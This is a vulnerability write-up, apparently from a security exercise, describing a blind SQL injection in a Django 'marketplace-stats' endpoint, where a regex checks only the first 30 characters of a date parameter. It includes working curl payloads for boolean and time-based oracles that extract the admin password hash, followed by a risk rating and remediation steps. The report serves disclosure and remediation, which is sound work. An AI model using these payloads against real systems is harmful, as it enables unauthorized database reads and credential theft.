# Description

**Vulnerability:** Blind SQL Injection via the undocumented `since` parameter of `GET /api/css/marketplace-stats/` (regex-bypass, time-based and boolean-based)

**CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command, "SQL Injection")

**Affected code:** `djangoWocshack_5/Api/views.py`, function `marketplace_stats()` (defined at line 3776)

```python
# djangoWocshack_5/Api/views.py
3787    since    = request.GET.get('since', '').strip()
...
3796    if since:
3797        if _re.match(r'^[\d\-]+$', since[:30]):          # validates only the first 30 chars
3798            conditions.append(f"created_at > '{since}'")  # full value interpolated raw
...
3800    where = " AND ".join(conditions)
...
3804            cur.execute(f"""
3805                SELECT COUNT(*) AS total, ...
3809                FROM Api_css
3810                WHERE {where}
3811            """)
...
3818    except Exception:
3819        return api_success({"total": 0, "free": 0, "paid": 0})
```

The route is registered in `djangoWocshack_5/Api/urls.py:241` (`path("css/marketplace-stats/", views.marketplace_stats, ...)`). The deployed OpenAPI schema does list the endpoint and its `since` parameter (`Api/views.py:1209-1218`, described as "ISO date — only files created after this date"), so it is not hidden from the schema in this build; the dev README's statement that it is undocumented does not match the deployed source. The endpoint is not linked from the UI, and it requires no authentication (`@require_GET` only, no `@api_auth_required`).

**Root cause.** The developer intended the `since` value to be a date string, and wrote a regex check to enforce that. The check, however, runs against `since[:30]`, i.e. only the first 30 characters, while the f-string on line 3798 interpolates the entire value into the SQL text. Any input whose first 30 characters are digits or hyphens passes the check, and everything from character 31 onward is attacker-controlled SQL.

**Regex-bypass pattern.** The 30-character prefix satisfies `^[\d\-]+$`, and the rest closes the SQL string literal, injects a boolean predicate, and comments out the trailing quote:

```
since = <30 chars of [0-9-]>' AND (<injection>) --
        └──── passes regex ───┘ └──── injected after char 30 ────┘

Rendered SQL (line 3810):
  WHERE is_active = 1 AND created_at > '2000-01-01-0000000000000000000' AND (<injection>) --'
```

Because the regex never sees character 31 onward, the quote and `--` are never validated. The quote at position 31 is the one that terminates the original literal, and `--` removes the original closing quote from the statement.

**Why it is hard to find.** The `since` parameter is not documented or linked from the UI, so testers who fuzz only `q`/`search`/`filter` never reach it. The regex creates a false sense of safety, and the endpoint never returns SQL errors: the `try/except` on lines 3818-3819 converts every database exception into `{"total":0,"free":0,"paid":0}`, so a malformed payload looks like a valid "zero results" response.

**Oracles.** Two side channels are available:

1. **Time (primary).** When the injected predicate is true, SQLite evaluates a large `randomblob` allocation (`SUM(length(randomblob(1000000)))` over up to 50 `Api_css` rows, roughly 50 MB). When it is false, that branch is skipped. Measured against the local stack: ~500 ms when the condition is true, ~10 ms when false.
2. **Body (secondary).** The injected predicate also gates the outer `WHERE`, so the JSON `total` changes with the condition: when the admin check is true the response is `{"total":N,...}` with N = the number of active CSS rows, and when it is false the response is `{"total":0,"free":0,"paid":0}`. The response is therefore *not* always identical as the internal dev notes suggest; the body itself is a usable boolean oracle when the attacker can see `total` and does not depend on timing. Timing is still the more robust channel for predicates that are equal on every row.

Note: the SQLite-specific `randomblob` technique is used because SQLite has no `SLEEP()`. The time signal depends on the number of rows in `Api_css` (the allocation scales with `min(rows, 50)`); with fewer than 50 active rows the TRUE delay shrinks proportionally.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Discover the endpoint by reading the source (or by fuzzing `GET /api/*` for undocumented routes), finding `marketplace_stats()` and its `since` parameter. | `since` is interpolated into SQL after a regex check on `since[:30]`. |
| 2 | Send a plain payload `since=foo'` to confirm the regex rejects it. | The regex `^[\d\-]+$` fails on the first character, so `since` is ignored and the response is the unfiltered count. |
| 3 | Send a payload whose first 30 characters are digits/hyphens: `2000-01-01-0000000000000000000' AND 1=1 --`. | Regex passes on the prefix; `AND 1=1` is true, so the response is the full count (e.g. `{"total":313,...}`). |
| 4 | Send the same prefix with `AND 1=2 --`. | The response becomes `{"total":0,"free":0,"paid":0}`, confirming boolean control over the outer `WHERE`. |
| 5 | Ask a yes/no question about the database through a time-gated subquery: `AND (SELECT CASE WHEN (SELECT COUNT(*) FROM auth_user WHERE username='admin')>0 THEN (SELECT SUM(length(randomblob(1000000))) FROM Api_css LIMIT 50) ELSE 0 END)>0 --`. | Response takes ~500 ms if the `admin` user exists, ~10 ms if not. Body is `total:N` vs `total:0`. |
| 6 | Repeat step 5 with a different username (`nobody`) to calibrate the FALSE baseline. | ~10 ms, confirming the timing oracle. |
| 7 | Extract data one character at a time with `SUBSTR()` on the target column, e.g. `SUBSTR((SELECT password FROM auth_user WHERE username='admin'),1,1)='p'`. | Slow response means the guessed character is correct. Iterate over the character set per position (about 50 requests per character for a 88-character hash, per the dev notes). |
| 8 | Use the recovered data (password hash, private rows from other tables) as needed. | Full read of any table reachable by the DB user, without authentication and without leaving login events in the application logs. |

# PoC

All requests are unauthenticated `GET` requests. `-w "%{time_total}"` prints the response time in seconds. Note that `--` in the payload is needed to comment out the original closing quote, and that the first 30 characters (`2000-01-01-0000000000000000000`) must consist only of digits and hyphens.

**1. Regex bypass, boolean body oracle (confirms injection)**

```bash
# Injected predicate TRUE -> full count returned
curl -s "http://localhost:8000/api/css/marketplace-stats/?since=2000-01-01-0000000000000000000'%20AND%201=1%20--"
# {"total":313,"free":35,"paid":278}

# Injected predicate FALSE -> zero rows
curl -s "http://localhost:8000/api/css/marketplace-stats/?since=2000-01-01-0000000000000000000'%20AND%201=2%20--"
# {"total":0,"free":0,"paid":0}
```

**2. Time-based blind oracle: does user `admin` exist?**

```bash
# TRUE branch: admin exists -> ~500 ms
curl -s -o /dev/null -w "%{time_total}\n" \
  "http://localhost:8000/api/css/marketplace-stats/?since=2000-01-01-0000000000000000000'%20AND%20(SELECT%20CASE%20WHEN%20(SELECT%20COUNT(*)%20FROM%20auth_user%20WHERE%20username='admin')%3E0%20THEN%20(SELECT%20SUM(length(randomblob(1000000)))%20FROM%20Api_css%20LIMIT%2050)%20ELSE%200%20END)%3E0%20--"

# FALSE branch: no such user -> ~10 ms
curl -s -o /dev/null -w "%{time_total}\n" \
  "http://localhost:8000/api/css/marketplace-stats/?since=2000-01-01-0000000000000000000'%20AND%20(SELECT%20CASE%20WHEN%20(SELECT%20COUNT(*)%20FROM%20auth_user%20WHERE%20username='nobody')%3E0%20THEN%20(SELECT%20SUM(length(randomblob(1000000)))%20FROM%20Api_css%20LIMIT%2050)%20ELSE%200%20END)%3E0%20--"
```

**3. Time-based extraction of the admin password hash, first character**

```bash
# Slow (~500 ms) => the first character of admin's password is 'p'
curl -s -o /dev/null -w "%{time_total}\n" -G \
  "http://localhost:8000/api/css/marketplace-stats/" \
  --data-urlencode "since=2000-01-01-0000000000000000000' AND (SELECT CASE WHEN SUBSTR((SELECT password FROM auth_user WHERE username='admin'),1,1)='p' THEN (SELECT SUM(length(randomblob(1000000))) FROM Api_css LIMIT 50) ELSE 0 END)>0 --"
```

Repeat step 3 for each position and each candidate character, classifying each response as slow (match) or fast (miss). A scripted loop over the charset with a threshold of ~250 ms is sufficient to separate the two classes.

**Expected results**

| Request | Predicate | Time | Body |
|---------|-----------|------|------|
| `admin` exists | TRUE | ~500 ms | `{"total":313,...}` |
| `nobody` | FALSE | ~10 ms | `{"total":0,"free":0,"paid":0}` |

The time delay is only observable when `Api_css` contains at least 50 rows, because the subquery uses `LIMIT 50`. Fewer rows shorten the delay proportionally, so timing thresholds should be calibrated against the target.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | **High.** Any table the application database user can read is reachable one bit at a time: `auth_user` (usernames, password hashes), `Api_css`, banking tables, private messages. No authentication is required. |
| Integrity | **None.** The injection point is in a `SELECT` statement and cannot modify data. Stacked queries are not possible through the Django cursor with a single `execute`. |
| Availability | **Low.** Each TRUE probe allocates about 50 MB inside SQLite. Automated extraction issues thousands of such requests, which can degrade the server, but a single request is not disruptive. |

Overall severity: **High** (CVSS 3.1 7.5, `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`). Full read of the database without credentials, reached through a parameter that is not documented and whose validation only inspects 30 characters. Difficulty is **Very Hard** because the endpoint must be discovered and the regex bypass understood from the source, and because extraction is blind and requires a timing or body oracle built from scratch. Impact is limited to confidentiality, and the attacker needs the target's row count and latency characteristics to calibrate the oracle.

# Remediation

1. **Use a parameterised query, not an f-string.** Bind `since` as a parameter, so the SQL text never contains user input:
   ```python
   params = []
   if since:
       conditions.append("created_at > %s")   # or "?" for sqlite3
       params.append(since)
   cur.execute(f"""SELECT ... FROM Api_css WHERE {where}""", params)
   ```
2. **Parse the value as a date.** Use `datetime.fromisoformat()` (or `django.utils.dateparse.parse_datetime`/`parse_date`) and reject anything that does not parse. Pass the typed value to the ORM, e.g. `Css.objects.filter(is_active=True, created_at__gt=since_dt)`, which removes raw SQL from this view entirely.
3. **Validate the whole value, not a slice.** If a regex is kept, use `re.fullmatch` against the complete string. Never validate `since[:30]`.
4. **Stop swallowing errors.** The `except Exception` on lines 3818-3819 hides failed queries behind a valid-looking zero-count response. Log the exception and return a 400 for invalid input so that malformed probes are visible in monitoring.
5. **Least-privilege database user.** The application's DB user should not be able to read `auth_user` password hashes or unrelated tables from a statistics endpoint. This limits the blast radius even when an injection is present.
6. **Document or remove the endpoint.** Hidden endpoints do not receive the same review as documented ones. Either remove `since` if it is not needed, or add the endpoint to the API schema so it is covered by normal security review.

# Author
WOCSA
